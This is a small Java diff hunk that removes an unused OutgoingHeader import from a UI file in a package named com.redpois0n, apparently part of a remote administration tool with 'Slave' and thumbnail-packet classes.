@@ -22,7 +22,6 @@ import javax.swing.border.EmptyBorder;
 import com.redpois0n.Slave;
 import com.redpois0n.Status;
 import com.redpois0n.exceptions.CloseException;
-import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.outgoing.Packet40Thumbnail;
 import com.redpois0n.ui.panels.PanelImage;
 import com.redpois0n.utils.FlagUtils;
